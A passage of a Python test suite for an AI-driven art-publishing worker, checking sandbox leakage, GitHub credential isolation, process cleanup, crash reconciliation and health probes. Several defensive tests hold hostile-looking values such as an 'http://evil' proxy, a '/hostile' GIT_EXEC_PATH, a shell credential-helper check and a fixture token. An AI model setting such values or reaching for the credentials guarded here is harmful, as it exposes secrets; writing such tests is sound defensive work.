        with self.assertRaises(EW.GateError) as cm:
            EW.staging_manifest(self.staging)
        self.assertIn("already contains a symlink", str(cm.exception))


class StagingLeakageCycleTests(WorkerEnv):
    """The review's repro, run through a whole cycle."""

    def maker_that_also_leaves(self, extra, slug="new-piece"):
        def fake(staging, prompt, wcfg, depth=0, runtime=None):
            staging = Path(staging)
            write_submission(staging / "out", slug, meta_for(slug))
            (staging / "state-out.json").write_text(json.dumps(
                {"cycle": 1, "last_slug": slug}), encoding="utf-8")
            extra(staging)
            return "ok", "SENTINEL_RESULT: CONTRIBUTED\n"
        return fake

    def run_with(self, extra):
        with mock.patch.object(EW, "run_model",
                               self.maker_that_also_leaves(extra)):
            return EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

    def test_a_draft_beside_the_submission_fails_the_cycle(self):
        summary = self.run_with(
            lambda s: (s / "draft.txt").write_text("notes", encoding="utf-8"))
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("draft.txt", summary["detail"])
        self.assertFalse(self.gh.calls, "nothing reaches GitHub")
        self.assertFalse(any(EW.SUCCESS_PREFIX in n for n in self.texts()))

    def test_a_rewritten_context_fails_the_cycle(self):
        summary = self.run_with(
            lambda s: (s / "context" / "prior.json").write_text(
                "[]", encoding="utf-8"))
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("read-only context", summary["detail"])

    def test_a_new_directory_fails_the_cycle(self):
        summary = self.run_with(lambda s: (s / "scratch").mkdir())
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("created the directory", summary["detail"])

    def test_the_clean_cycle_still_contributes(self):
        summary = self.run_with(lambda s: None)
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)


class PublishAuthTests(WorkerEnv):
    """Three live cycles made art and then could not push (#B)."""

    def setUp(self):
        super().setUp()
        self.wcfg = dict(EW.worker_config({}),
                         repo="kody-w/public-art-collective")

    def fake_fill(self, stdout, returncode=0):
        real_run = subprocess.run

        def run(argv, *a, **kw):
            if len(argv) > 1 and argv[1] == "credential":
                return subprocess.CompletedProcess(argv, returncode,
                                                   stdout=stdout, stderr="")
            return real_run(argv, *a, **kw)
        return run

    # ── the generated helper ──
    def test_the_helper_is_generated_not_inherited(self):
        home = self.home / "githome"
        helper = EW.credential_helper_path(self.wcfg, home)
        body = helper.read_text()
        self.assertIn("auth git-credential", body)
        self.assertIn(str(EW.REAL_HOME), body)
        self.assertIn(str(EW.real_gh_config_dir()), body)
        self.assertEqual(0o700, helper.stat().st_mode & 0o777)
        self.assertTrue(body.startswith("#!/bin/sh"))

    def test_a_malicious_global_helper_is_never_carried_over(self):
        with mock.patch.object(EW, "_CTX_CACHE", {}):
            env = EW.controller_git_env(home=self.home / "gh2")
        config = Path(env["GIT_CONFIG_GLOBAL"]).read_text()
        self.assertNotIn("!", config.split("helper =")[-1],
                         "a shell helper string must never reach the config")
        self.assertIn("gh-credential-helper", config)
        self.assertIn('[credential "https://github.com"]', config)

    def test_the_generated_config_holds_nothing_else(self):
        with mock.patch.object(EW, "_CTX_CACHE", {}):
            env = EW.controller_git_env(home=self.home / "gh3")
        directives = [ln for ln in
                      Path(env["GIT_CONFIG_GLOBAL"]).read_text().splitlines()
                      if ln.strip() and not ln.lstrip().startswith("#")]
        self.assertEqual(2, len(directives), directives)
        self.assertTrue(directives[0].startswith('[credential "https://github.com"]'))
        self.assertTrue(directives[1].strip().startswith("helper = /"))

    # ── isolation of the credential material ──
    def test_git_never_sees_the_gh_config_dir(self):
        with mock.patch.object(EW, "_CTX_CACHE", {}):
            env = EW.controller_git_env(home=self.home / "gh4")
        self.assertNotIn("GH_CONFIG_DIR", env)
        self.assertNotEqual(str(EW.REAL_HOME), env["HOME"])

    def test_gh_gets_the_real_home_and_config_and_nothing_ambient(self):
        with mock.patch.dict(os.environ, {"GIT_EXEC_PATH": "/hostile",
                                          "https_proxy": "http://evil"}):
            env = EW.controller_gh_env(self.wcfg)
        self.assertEqual(str(EW.REAL_HOME), env["HOME"])
        self.assertEqual(str(EW.real_gh_config_dir()), env["GH_CONFIG_DIR"])
        self.assertNotIn("GIT_EXEC_PATH", env)
        self.assertNotIn("https_proxy", env)

    def test_no_model_process_can_see_the_gh_config_or_token(self):
        ws = self.home / "modelws"
        ws.mkdir()
        env = SS.confined_env(SS.fanout_config({"fanout": {"isolated_home": False}}),
                              ws, 0, env={"HOME": "/Users/x",
                                          "GH_CONFIG_DIR": str(EW.real_gh_config_dir()),
                                          "GITHUB_TOKEN": "secret"})
        self.assertTrue(env["GH_CONFIG_DIR"].startswith(str(ws)),
                        "the model's gh config must be an empty workspace dir")
        self.assertNotIn("GITHUB_TOKEN", env)
        self.assertNotEqual(str(EW.real_gh_config_dir()), env["GH_CONFIG_DIR"])

    # ── the gh config directory itself ──
    def test_a_gh_config_dir_outside_the_real_home_is_refused(self):
        with self.assertRaises(EW.GateError) as cm:
            EW.real_gh_config_dir({"gh_config_dir": "/etc"})
        self.assertIn("not under", str(cm.exception))

    def test_a_world_writable_gh_config_dir_is_refused(self):
        loose = EW.REAL_HOME / f".rapp-test-gh-{uuid.uuid4().hex[:8]}"
        loose.mkdir(mode=0o777)
        self.addCleanup(loose.rmdir)
        os.chmod(loose, 0o777)
        with self.assertRaises(EW.GateError) as cm:
            EW.real_gh_config_dir({"gh_config_dir": str(loose)})
        self.assertIn("writable", str(cm.exception))

    def test_a_missing_gh_config_dir_is_refused(self):
        with self.assertRaises(EW.GateError):
            EW.real_gh_config_dir({"gh_config_dir": str(EW.REAL_HOME / "nope-xyz")})

    # ── the preflight ──
    def test_the_preflight_passes_when_permission_and_credentials_exist(self):
        credential = "fixture-" + "credential"
        with mock.patch.object(EW, "_gh",
                               return_value='{"viewerPermission": "ADMIN"}'), \
             mock.patch.object(EW.subprocess, "run",
                               self.fake_fill(
                                   f"username=fixture-user\n"
                                   f"password={credential}\n")):
            detail = EW.assert_publish_auth(self.wcfg)
        self.assertIn("ADMIN", detail)
        self.assertNotIn(credential, detail, "no secret may reach a log line")
        self.assertIn(f"password {len(credential)} chars", detail)

    def test_read_only_permission_stops_the_cycle(self):
        with mock.patch.object(EW, "_gh",
                               return_value='{"viewerPermission": "READ"}'):
            with self.assertRaises(EW.AbortError) as cm:
                EW.assert_publish_auth(self.wcfg)
        self.assertIn("READ", str(cm.exception))

    def test_missing_credentials_stop_the_cycle(self):
        with mock.patch.object(EW, "_gh",
                               return_value='{"viewerPermission": "WRITE"}'), \
             mock.patch.object(EW.subprocess, "run", self.fake_fill("")):
            with self.assertRaises(EW.AbortError) as cm:
                EW.assert_publish_auth(self.wcfg)
        self.assertIn("no username, password", str(cm.exception))

    def test_a_failing_credential_helper_stops_the_cycle(self):
        with mock.patch.object(EW, "_gh",
                               return_value='{"viewerPermission": "WRITE"}'), \
             mock.patch.object(EW.subprocess, "run",
                               self.fake_fill("", returncode=1)):
            with self.assertRaises(EW.AbortError) as cm:
                EW.assert_publish_auth(self.wcfg)
        self.assertIn("credential fill failed", str(cm.exception))

    def test_a_local_repo_needs_no_credentials(self):
        detail = EW.assert_publish_auth(dict(self.wcfg, repo=str(self.origin)))
        self.assertIn("needs no credentials", detail)

    # ── ordering: before any spend ──
    def test_the_preflight_runs_before_any_child_or_maker(self):
        cfg = worker_cfg(evolve_worker={
            "repo": "kody-w/public-art-collective",
            "fanout": {"enabled": True, "children": 3}})
        with mock.patch.object(EW, "assert_publish_auth",
                               side_effect=EW.AbortError("no credentials")), \
             mock.patch.object(EW.SS, "run_children") as children, \
             mock.patch.object(EW, "run_model") as maker:
            summary = EW.run_once(cfg=cfg, health=lambda phase: healthy())
        self.assertEqual("skipped", summary["outcome"])
        self.assertIn("publish auth unavailable", summary["reason"])
        children.assert_not_called()
        maker.assert_not_called()
        self.assertFalse(EW.HISTORY_PATH.exists(),
                         "an unpublishable cycle spends nothing")

    def test_a_healthy_preflight_lets_the_cycle_proceed(self):
        with mock.patch.object(EW, "assert_publish_auth",
                               return_value="push permission ADMIN"), \
             mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)

    def test_no_secret_reaches_the_worker_log(self):
        log_text = []
        credential = "fixture-" + "credential-secret"
        with mock.patch.object(EW, "log", side_effect=log_text.append), \
             mock.patch.object(EW, "_gh",
                               return_value='{"viewerPermission": "ADMIN"}'), \
             mock.patch.object(EW.subprocess, "run",
                               self.fake_fill(
                                   f"username=fixture-user\n"
                                   f"password={credential}\n")):
            EW.assert_publish_auth(self.wcfg)
        self.assertFalse(any(credential in line for line in log_text))


class LifecycleTests(WorkerEnv):
    """A stopped worker leaves nothing running (#4)."""

    def test_sigterm_kills_the_whole_tree_and_frees_the_lock(self):
        repo_root = Path(__file__).resolve().parent
        marker = self.home / "grandchild.pid"
        shim_dir = self.home / "bin"
        shim_dir.mkdir()
        shim = shim_dir / "copilot"
        # The marker is written atomically: a half-created file is exactly
        # the empty-string read that made this test flake under load.
        shim.write_text(
            "#!/usr/bin/env bash\n"
            f"{sys.executable} -c \"import os,subprocess,sys,time;"
            "p=subprocess.Popen([sys.executable,'-c','import time;time.sleep(120)']);"
            f"tmp={str(marker) + '.tmp'!r};"
            "open(tmp,'w').write(str(p.pid));"
            f"os.replace(tmp,{str(marker)!r});time.sleep(120)\"\n",
            encoding="utf-8")
        shim.chmod(0o755)

        cfg = dict(self.cfg, notify=False)
        cfg["evolve_worker"] = {**cfg["evolve_worker"],
                                "fanout": {"enabled": False,
                                           "isolated_home": False}}
        (self.home / "cfg.json").write_text(json.dumps(cfg), encoding="utf-8")
        driver = self.home / "driver.py"
        driver.write_text(
            "import json, sys\n"
            f"sys.path.insert(0, {str(repo_root)!r})\n"
            "import evolve_worker as EW\n"
            "EW.install_signal_handlers()\n"
            f"cfg = json.load(open({str(self.home / 'cfg.json')!r}))\n"
            "healthy = {'status': 'healthy', 'failed': [], 'critical': [],\n"
            "           'checks': [], 'summary': 'ok'}\n"
            "print(json.dumps(EW.run_once(cfg=cfg, health=lambda p: healthy)))\n",
            encoding="utf-8")

        env = dict(os.environ)
        env["SENTINEL_HOME"] = str(self.home)
        env["PATH"] = f"{shim_dir}:{env['PATH']}"
        proc = subprocess.Popen([sys.executable, str(driver)], env=env,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                text=True, start_new_session=True)
        self.addCleanup(_reap_tree, proc)

        # Generous waits: this test is about what SURVIVES a SIGTERM, not
        # about how fast a loaded machine gets there. A tight deadline here
        # only ever measures the test runner.
        deadline = time.monotonic() + 120
        while time.monotonic() < deadline and not marker.exists():
            time.sleep(0.1)
        self.assertTrue(marker.exists(), "the fake maker never started")
        grandchild = int(marker.read_text())

        proc.send_signal(signal.SIGTERM)
        try:
            out, err = proc.communicate(timeout=180)
        except subprocess.TimeoutExpired:
            proc.kill()
            out, err = proc.communicate()
            self.fail("the worker did not exit after SIGTERM")

        self.assertTrue(_dead(grandchild),
                        "a model's grandchild outlived the worker's SIGTERM")
        self.assertTrue(_dead(proc.pid))

        workspaces = self.home / "state" / "evolve-workspaces"
        self.assertEqual([], list(workspaces.iterdir()) if workspaces.exists() else [],
                         "the workspace must be removed on the way out")

        status_file = self.home / "state" / "evolve-worker-status.json"
        deadline = time.monotonic() + 15
        while time.monotonic() < deadline and not status_file.exists():
            time.sleep(0.1)
        status = json.loads(status_file.read_text())
        self.assertEqual("interrupted", status["outcome"], status)

        # The lock is only free once the tree is gone — which it now is.
        lock = EW.acquire_lock(self.home / "state" / "evolve-worker.lock")
        self.addCleanup(EW.release_lock, lock)
        self.assertIsNotNone(lock, "the lock outlived the pass")

    def test_the_lock_is_still_held_while_a_model_is_alive(self):
        released = []
        real_release = EW.release_lock

        def watched(fd):
            released.append(EW.live_processes())
            return real_release(fd)

        def slow_maker(staging, prompt, wcfg, depth=0, runtime=None):
            proc = subprocess.Popen(
                [sys.executable, "-c", "import time; time.sleep(30)"],
                start_new_session=True)
            EW.track(proc)
            return EW.OUTCOME_FAILED, "left something running"

        with mock.patch.object(EW, "run_model", slow_maker), \
             mock.patch.object(EW, "release_lock", watched):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual([[]], released,
                         "nothing may still be running when the lock is dropped")

    def test_kill_tracked_reports_what_it_had_to_kill(self):
        proc = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)"],
                                start_new_session=True)
        EW.track(proc)
        self.assertEqual(1, EW.kill_tracked())
        self.assertTrue(_dead(proc.pid))
        self.assertEqual([], EW.live_processes())


class ReconciliationTests(WorkerEnv):
    """The crash window between `gh pr merge` and the ledger write (#5)."""

    def crash_after(self, phase):
        """A publish that dies right after `phase` was recorded."""
        real_publish = EW.publish

        def dying(clone, submission, wcfg, health, branch=None,
                  transaction=None, ctx=None, profile_snapshot=None):
            def note(**fields):
                state = transaction(**fields) if transaction else {}
                if fields.get("phase") == phase:
                    raise KeyboardInterrupt("power cut")
                return state
            return real_publish(clone, submission, wcfg, health, branch, note,
                                ctx, profile_snapshot)
        return dying

    def test_a_merge_that_was_never_recorded_is_finished_on_the_next_pass(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()), \
             mock.patch.object(EW, "publish", self.crash_after("merged")):
            first = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("interrupted", first["outcome"], first)

        # The art IS public: the merge happened before the interruption.
        self.assertIn("submissions/new-piece/piece.svg",
                      git_bare(self.origin, "ls-tree", "--name-only", "-r", "main"))
        history = json.loads(EW.HISTORY_PATH.read_text())
        self.assertEqual("pending", history[0]["outcome"])
        self.assertTrue(EW.TRANSACTION_PATH.exists())
        self.assertEqual([], self.texts(), "nothing was announced yet")

        with mock.patch.object(EW, "run_model") as maker:
            second = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual("reconciled-contributed", second["outcome"], second)
        maker.assert_not_called()
        history = json.loads(EW.HISTORY_PATH.read_text())
        self.assertEqual(1, len(history), "reconciling is not a second cycle")
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, history[0]["outcome"])
        state = json.loads((self.state / "evolve-creative-state.json").read_text())
        self.assertEqual("new-piece", state["last_slug"])
        self.assertEqual(1, len(self.notifications), "exactly one message")
        self.assertIn(EW.SUCCESS_PREFIX, self.texts()[0])
        self.assertFalse(EW.TRANSACTION_PATH.exists())

    def test_main_moves_then_merge_command_raises_without_respending(self):
        self.gh.raise_after_merge = EW.CommandError(
            "gh pr merge timed out after server accepted it")
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            first = EW.run_once(
                cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual("merge-pending", first["outcome"], first)
        self.assertIn(
            "submissions/new-piece/piece.svg",
            git_bare(self.origin, "ls-tree", "--name-only", "-r", "main"))
        transaction = json.loads(EW.TRANSACTION_PATH.read_text())
        self.assertEqual("merge-ambiguous", transaction["phase"])
        history = json.loads(EW.HISTORY_PATH.read_text())
        self.assertEqual("pending", history[0]["outcome"])
        self.assertEqual([], self.notifications)

        self.gh.raise_after_merge = None
        with mock.patch.object(EW, "run_model") as maker:
            second = EW.run_once(
                cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("reconciled-contributed", second["outcome"], second)
        maker.assert_not_called()
        self.assertEqual(1, len(json.loads(EW.HISTORY_PATH.read_text())))
        self.assertEqual(1, len(self.notifications))
        self.assertFalse(EW.TRANSACTION_PATH.exists())

    def test_an_abandoned_pr_is_closed_and_the_row_marked_aborted(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()), \
             mock.patch.object(EW, "publish", self.crash_after("pr-open")):
            first = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("interrupted", first["outcome"])
        self.assertTrue(EW.TRANSACTION_PATH.exists())

        with mock.patch.object(EW, "run_model") as maker:
            second = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("reconciled-aborted", second["outcome"], second)
        maker.assert_not_called()
        self.assertTrue(self.gh.called("pr", "close"))
        history = json.loads(EW.HISTORY_PATH.read_text())
        self.assertEqual(EW.OUTCOME_ABORTED, history[0]["outcome"])
        self.assertFalse(any(EW.SUCCESS_PREFIX in n for n in self.texts()))
        self.assertFalse((self.state / "evolve-creative-state.json").exists())
        self.assertFalse(EW.TRANSACTION_PATH.exists())

    def test_a_death_before_any_pr_is_recorded_as_aborted(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()), \
             mock.patch.object(EW, "publish", self.crash_after("committed")):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        with mock.patch.object(EW, "run_model") as maker:
            second = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("reconciled-aborted", second["outcome"])
        maker.assert_not_called()
        history = json.loads(EW.HISTORY_PATH.read_text())
        self.assertEqual(EW.OUTCOME_ABORTED, history[0]["outcome"])

    def test_unreceipted_legacy_png_transaction_stays_fail_closed(self):
        row = {
            "id": "legacy-png-row",
            "at": NOW.isoformat(),
            "mode": "evolve",
            "role": "openrappter",
            "cycle": 1,
            "outcome": "pending",
        }
        EW.save_history([row])
        EW.transaction_writer(row["id"], {
            "phase": "gated",
            "slug": "legacy-png",
            "submission": {
                "slug": "legacy-png",
                "kind": "png",
                "meta": meta_for("legacy-png", kind="png"),
            },
            "profile_snapshot": None,
        })()
        with mock.patch.object(EW, "run_model") as maker:
            result = EW.run_once(
                cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("fail-closed", result["outcome"], result)
        self.assertIn("no reviewed-profile receipt", result["reason"])
        maker.assert_not_called()
        self.assertTrue(EW.TRANSACTION_PATH.exists())

    def test_the_next_cycle_number_follows_the_reconciled_ledger(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()), \
             mock.patch.object(EW, "publish", self.crash_after("merged")):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        with mock.patch.object(EW, "run_model",
                               self.model_that_submits(slug="second-piece",
                                                       cycle=2,
                                                       previous="new-piece")):
            third = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, third["outcome"], third)


class HealthProbeTests(WorkerEnv):
    """A probe that cannot answer is not an answer (#5, #8)."""

    def test_a_raising_probe_before_the_merge_blocks_and_cleans_up(self):
        def health(phase):
            if phase == "pre-merge":
                raise RuntimeError("health.py exploded")
            return healthy()
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=health)
        self.assertEqual(EW.OUTCOME_ABORTED, summary["outcome"])
        self.assertIn("RuntimeError", summary["detail"])
        self.assertFalse(self.gh.called("pr", "merge"))
        self.assertTrue(self.gh.called("pr", "close"))

    def test_a_malformed_verdict_before_the_merge_blocks(self):
        def health(phase):
            return healthy() if phase != "pre-merge" else {"status": "healthy"}
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=health)
        self.assertEqual(EW.OUTCOME_ABORTED, summary["outcome"])
        self.assertIn("missing", summary["detail"])
        self.assertFalse(self.gh.called("pr", "merge"))

    def test_a_raising_probe_at_the_start_never_spends_a_model(self):
        def health(phase):
            raise TimeoutError("no answer")
        with mock.patch.object(EW, "run_model") as maker:
            summary = EW.run_once(cfg=self.cfg, health=health)
        self.assertEqual("skipped", summary["outcome"])
        self.assertIn("TimeoutError", summary["reason"])
        maker.assert_not_called()


class ViewProbeTests(WorkerEnv):
    """Never text a triumphant 404 (#10)."""

    def test_a_live_pages_url_is_used(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        text = self.texts()[0]
        self.assertIn("Public Art Collective: https://kody-w.github.io/", text)
        self.assertTrue(self.probes, "the url was probed before it was sent")

    def test_pages_lagging_falls_back_to_the_verified_raw_url(self):
        self.probe_answer = lambda url: "raw.githubusercontent.com" in url
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        text = self.texts()[0]
        self.assertIn("Public Art Collective: https://raw.githubusercontent.com/",
                      text)
        self.assertIn("Pages has not published it yet", text)
        self.assertNotIn("Public Art Collective: https://kody-w.github.io/", text)

    def test_nothing_answering_says_so_instead_of_linking_a_404(self):
        self.probe_answer = lambda url: False
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"])
        text = self.texts()[0]
        self.assertNotIn("Public Art Collective:", text)
        self.assertIn("no public URL answered yet", text)

    def test_the_probe_retries_before_giving_up(self):
        answers = iter([False, False, True])
        self.probe_answer = lambda url: ("github.io" in url
                                         and next(answers, True))
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertGreater(len(self.probes), 2, "it retried")
        self.assertIn("Public Art Collective: https://kody-w.github.io/",
                      self.texts()[0])

    def test_the_probed_url_is_recorded_in_the_ledger(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        row = json.loads(EW.HISTORY_PATH.read_text())[0]
        self.assertEqual("pages", row["view_kind"])
        self.assertTrue(row["view_url"].startswith("https://kody-w.github.io/"))


class HeartbeatTests(WorkerEnv):
    """Enabled-but-not-running must not look like 'nothing to make' (#6)."""

    def test_every_pass_writes_a_heartbeat(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        status = json.loads(EW.STATUS_PATH.read_text())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, status["outcome"])
        self.assertEqual("openrappter", status["role"])
        self.assertEqual(os.getpid(), status["pid"])

    def test_a_skip_writes_a_heartbeat_too(self):
        EW.run_once(cfg=self.cfg, health=lambda phase: critical("rb_workflows"))
        status = json.loads(EW.STATUS_PATH.read_text())
        self.assertEqual("skipped", status["outcome"])
        self.assertIn("rb_workflows", status["reason"])

    def test_a_failure_writes_a_heartbeat_too(self):
        with mock.patch.object(EW, "run_model",
                               lambda *a, **k: (EW.OUTCOME_TIMEOUT, "timed out")):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        status = json.loads(EW.STATUS_PATH.read_text())
        self.assertEqual(EW.OUTCOME_TIMEOUT, status["outcome"])


def _dead(pid, timeout=10):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            os.kill(pid, 0)
        except ProcessLookupError:
            return True
        except PermissionError:
            return False
        time.sleep(0.05)
    return False


def _reap_tree(proc):
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
    except (ProcessLookupError, PermissionError):
        pass
    try:
        proc.wait(timeout=5)
    except Exception:
        pass


class ChildDebitTests(WorkerEnv):
    """Spend recorded before it happens, so a crash cannot refund it (#9)."""

    def setUp(self):
        super().setUp()
        self.cfg = worker_cfg(evolve_worker={
            "repo": str(self.origin),
            "fanout": {"enabled": True, "children": 3}})

    def test_the_debit_lands_before_the_children_are_spawned(self):
        seen = {}

        def spy(*args, **kwargs):
            rows = json.loads(EW.HISTORY_PATH.read_text())
            seen["children_at_spawn"] = rows[0]["children"]
            return [child_result("a"), child_result("b"),
                    child_result("adversarial-verifier", wave=2)]

        with mock.patch.object(EW.SS, "run_children", spy), \
             mock.patch.object(EW, "run_model",
                               FanoutIntegrationTests.maker_using_finalists(self)):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(3, seen["children_at_spawn"],
                         "the ledger is debited before the processes start")

    def test_a_raised_future_cannot_erase_the_debit(self):
        def exploding(*args, **kwargs):
            raise RuntimeError("a wave died badly")
        with mock.patch.object(EW.SS, "run_children", exploding), \
             mock.patch.object(EW, "run_model") as maker:
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("crashed", summary["outcome"])
        maker.assert_not_called()
        row = json.loads(EW.HISTORY_PATH.read_text())[0]
        self.assertEqual(3, row["children"], "spent credit stays spent")
        self.assertEqual(3, SS.children_spent([row]))

    def test_an_interrupted_fanout_keeps_its_debit(self):
        def interrupted(*args, **kwargs):
            raise KeyboardInterrupt("SIGTERM")
        with mock.patch.object(EW.SS, "run_children", interrupted):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("interrupted", summary["outcome"])
        row = json.loads(EW.HISTORY_PATH.read_text())[0]
        self.assertEqual(3, row["children"])

    def test_the_next_pass_sees_yesterdays_children(self):
        with mock.patch.object(EW.SS, "run_children",
                               return_value=[child_result("a"), child_result("b"),
                                             child_result("adversarial-verifier",
                                                          wave=2)]), \
             mock.patch.object(EW, "run_model",
                               FanoutIntegrationTests.maker_using_finalists(self)):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        history = json.loads(EW.HISTORY_PATH.read_text())
        cfg = SS.fanout_config(EW.worker_config(self.cfg))
        specs, why = SS.plan_children(dict(cfg, daily_child_budget=3), history, 0)
        self.assertEqual([], specs)
        self.assertIn("child budget spent", why)


# ── the tick keeps ticking ──────────────────────────────────────────────────
class WorkerSupervisionTests(unittest.TestCase):
    def setUp(self):
        self.temp = scratch_dir("supervision")
        self.plist = self.temp / "com.rapp.evolve-worker.plist"
        self.plist.write_text("<plist/>", encoding="utf-8")
        self.addCleanup(shutil.rmtree, self.temp, True)
        self.cfg = {"evolve_worker": {"enabled": True}}

    @staticmethod
    def result(code=0, stdout="", stderr=""):
        return subprocess.CompletedProcess([], code, stdout, stderr)

    def test_a_missing_enabled_job_is_enabled_loaded_and_started(self):
        answers = [
            self.result(1, stderr="not found"),
            self.result(),
            self.result(),
            self.result(),
        ]
        with mock.patch.object(sentinel.subprocess, "run",
                               side_effect=answers) as run:
            self.assertTrue(sentinel.ensure_evolution_worker_loaded(
                self.cfg, plist=self.plist, platform="darwin", uid=501))
        commands = [call.args[0] for call in run.call_args_list]
        self.assertEqual(["/bin/launchctl", "enable",
                          "gui/501/com.rapp.evolve-worker"], commands[1])
        self.assertEqual(["/bin/launchctl", "bootstrap", "gui/501",
                          str(self.plist)], commands[2])
        self.assertEqual(["/bin/launchctl", "kickstart",
                          "gui/501/com.rapp.evolve-worker"], commands[3])

    def test_an_already_loaded_job_is_left_alone(self):
        with mock.patch.object(
                sentinel.subprocess, "run",
                return_value=self.result()) as run:
            self.assertTrue(sentinel.ensure_evolution_worker_loaded(
                self.cfg, plist=self.plist, platform="darwin", uid=501))
        self.assertEqual(1, run.call_count)

    def test_a_disabled_worker_is_never_started(self):
        with mock.patch.object(sentinel.subprocess, "run") as run:
            self.assertFalse(sentinel.ensure_evolution_worker_loaded(
                {"evolve_worker": {"enabled": False}},
                plist=self.plist, platform="darwin", uid=501))
        run.assert_not_called()

    def test_a_wedged_launchctl_cannot_wedge_the_health_tick(self):
        with mock.patch.object(
                sentinel.subprocess, "run",
                side_effect=subprocess.TimeoutExpired("launchctl", 30)):
            self.assertFalse(sentinel.ensure_evolution_worker_loaded(
                self.cfg, plist=self.plist, platform="darwin", uid=501))


class TickDelegationTests(unittest.TestCase):
    """Requirement 1: a delegated tick spends no model on art, and still
    diagnoses a critical platform failure."""

    def setUp(self):
        self.home = scratch_dir("tick")
        (self.home / "state").mkdir()
        (self.home / "logs").mkdir()
        for name, value in (("STATE", self.home / "state"),
                            ("LOGS", self.home / "logs"),
                            ("STOP", self.home / "STOP")):
            p = mock.patch.object(sentinel, name, value)
            p.start()
            self.addCleanup(p.stop)
        for name in ("notify", "refresh_dashboard", "publish_head_hook",
                     "ensure_evolution_worker_loaded"):
            if hasattr(sentinel, name):
                p = mock.patch.object(sentinel, name, mock.Mock())
                p.start()
                self.addCleanup(p.stop)
        p = mock.patch.object(sentinel, "NB", mock.MagicMock())
        p.start()
        self.addCleanup(p.stop)
        p = mock.patch.object(sentinel, "outsider_smoke", return_value=False)
        p.start()
        self.addCleanup(p.stop)
        p = mock.patch.object(sentinel, "config", return_value={
            **sentinel.DEFAULTS, "level": 3, "notify": False,
            "repair_enabled": False,
            "evolve_worker": {"enabled": True},
        })
        p.start()
        self.addCleanup(p.stop)

    def tearDown(self):
        shutil.rmtree(self.home, ignore_errors=True)

    def test_enabled_flag_reads_the_block(self):
        self.assertTrue(sentinel.evolution_worker_enabled(
            {"evolve_worker": {"enabled": True}}))
        self.assertFalse(sentinel.evolution_worker_enabled(
            {"evolve_worker": {"enabled": False}}))
        self.assertFalse(sentinel.evolution_worker_enabled({}))
        self.assertFalse(sentinel.evolution_worker_enabled(
            {"evolve_worker": "yes"}))

    def test_a_healthy_delegated_tick_invokes_no_model(self):
        with mock.patch.object(sentinel, "run_health", return_value=healthy()), \
             mock.patch.object(sentinel, "evolve") as evolve, \
             mock.patch.object(sentinel, "escalate") as escalate:
            self.assertEqual(0, sentinel.main())
        evolve.assert_not_called()
        escalate.assert_not_called()

    def test_a_delegated_tick_still_diagnoses_a_critical_failure(self):
        verdict = {"status": "critical", "failed": ["rb_frontdoor"],
                   "critical": ["rb_frontdoor"], "checks": [], "summary": "down"}
        with mock.patch.object(sentinel, "run_health", return_value=verdict), \
             mock.patch.object(sentinel, "evolve") as evolve, \
             mock.patch.object(sentinel, "escalate",
                               return_value=(True, "SENTINEL_RESULT: BLOCKED x")) as esc:
            self.assertEqual(0, sentinel.main())
        evolve.assert_not_called()
        esc.assert_called_once()
        self.assertEqual("diagnose", esc.call_args.args[3],
